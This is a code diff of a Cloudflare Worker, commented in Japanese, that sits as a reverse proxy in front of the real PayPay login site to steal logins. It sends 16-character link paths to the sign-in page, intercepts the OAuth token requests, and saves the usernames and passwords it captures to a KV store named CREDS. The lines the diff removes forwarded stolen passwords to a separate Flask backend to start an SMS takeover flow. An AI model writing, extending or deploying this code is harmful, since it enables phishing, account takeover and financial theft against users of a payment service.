@@ -3,10 +3,11 @@
 // Deploy: wrangler deploy
 //
 // 本物の www.paypay.ne.jp を中継。
-// JS 解析結果: ログインは POST /app/v1/oauth/token (grant_type=password or otp)
-// password grant をキャプチャしたら Flask の /api/worker_capture に通知して SMS フローを開始させる。
+// 16文字のリンクIDパスは PayPay ログインページにプロキシ。
+// /app/v1/oauth/token の password grant をキャプチャして KV に保存。
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
+const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
 
 export default {
   async fetch(request, env) {
@@ -16,6 +17,14 @@ export default {
     const secret = (env.SECRET || "").trim();
     if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
       return handleStore(request, env);
+    }
+
+    // 16文字IDの場合はログインページにプロキシ
+    const pathParts = url.pathname.split("/").filter(Boolean);
+    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
+      const loginUrl = new URL(request.url);
+      loginUrl.pathname = "/app/account/sign-in";
+      return proxy(new Request(loginUrl, request), env, workerHost);
     }
 
     return proxy(request, env, workerHost);
@@ -33,7 +42,6 @@ async function proxy(request, env, workerHost) {
   headers.delete("cf-visitor");
 
   let body = request.body;
-  let captured = null;
 
   if ((request.method === "POST" || request.method === "PUT") && url.pathname.includes("/oauth/token")) {
     const clone = request.clone();
@@ -47,7 +55,7 @@ async function proxy(request, env, workerHost) {
         for (const [k, v] of params) parsed[k] = v;
       }
 
-      captured = {
+      const captured = {
         type: "oauth_token",
         path: url.pathname,
         grant_type: parsed.grant_type || null,
@@ -64,22 +72,8 @@ async function proxy(request, env, workerHost) {
 
       const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
       await env.CREDS.put(key, JSON.stringify(captured));
-
-      // password grant なら Flask に通知してログインを試みる
-      if (captured.grant_type === "password" && captured.username && captured.password && env.FLASK_BACKEND_URL) {
-        try {
-          await fetch(env.FLASK_BACKEND_URL.replace(/\/$/, "") + "/api/worker_capture", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              username: captured.username,
-              password: captured.password,
-            }),
-          });
-        } catch {}
-      }
     } catch {
-      // ignore parse error
+      // ignore
     }
   } else if (request.method === "POST" || request.method === "PUT") {
     const clone = request.clone();
